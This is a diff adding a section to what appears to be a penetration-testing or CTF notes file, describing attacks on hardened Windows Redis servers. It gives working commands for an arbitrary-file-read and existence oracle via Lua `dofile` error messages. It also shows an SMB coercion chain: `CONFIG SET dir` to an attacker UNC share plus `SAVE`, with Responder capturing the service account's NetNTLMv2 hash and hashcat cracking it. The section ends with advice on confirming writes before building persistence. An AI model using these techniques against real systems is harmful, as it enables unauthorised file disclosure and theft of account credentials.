@@ -2869,3 +2869,40 @@ Also works for non-Go daemons: `strings`/`objdump`/Ghidra to find the compared c
 [[binary-exploitation]].
 
 <!-- promoted-slug: go-service-rodata-rce -->
+
+## Redis on Windows: `dofile` read-oracle + UNC-coerce (when the full Lua escapes are patched)
+
+The Debian `liblua`/`MODULE`/master-slave RCE paths are Linux-side. On a hardened **Windows** Redis
+(e.g. 2.8.x) the Lua sandbox blocks `io`/`os`/`loadfile`/`require`, so those escapes fail - but two
+weaker primitives usually survive and are enough.
+
+**File-read oracle via `dofile`.** `dofile` is often left exposed. It tries to PARSE the target file
+as Lua, fails, and echoes a fragment of the file's first line back in the parse error - a one-line
+arbitrary-file read as the Redis service account:
+
+```bash
+redis-cli -h <IP> EVAL "return tostring(dofile)" 0    # function: ... = exposed (io/os/loadfile raise "unexisting global")
+redis-cli -h <IP> EVAL "dofile('C:/Users/<svc>/Desktop/user.txt')" 0
+#   -> ...malformed number near '<flag>'   (content leaked in the error)
+```
+
+It doubles as an **exists/permission oracle**: `Permission denied` = file present but the service
+account can't read it (e.g. another user's `system.txt`); `No such file or directory` = absent. Use
+it to map where the flag lives before escalating.
+
+**Coerce SMB auth -> NetNTLMv2.** Redis runs as a real user; point its working dir at a UNC path and
+force a file op, and it authenticates to your SMB listener. Capture and crack for that user's creds:
+
+```bash
+responder -I <iface> -dwv
+redis-cli -h <IP> CONFIG SET dir '//<LHOST>/pub'
+redis-cli -h <IP> SAVE                 # coerces the auth; Responder logs enterprise-security::DOMAIN:...
+hashcat -m 5600 ntlmv2.hash rockyou.txt
+```
+
+**Write-oracle gotcha:** `CONFIG SET dir <path>` + `SAVE` returns `OK` even when the dir change was
+silently rejected, so `SAVE`->OK is NOT proof a path is writable (a locked-down dir like
+`C:\Windows\System32\Tasks` reported "writable" but no file landed). Verify every claimed write by
+reading the file back with the `dofile` oracle before building an RCE/persistence step on it.
+
+<!-- promoted-slug: redis-windows-dofile-oracle-unc-coerce -->
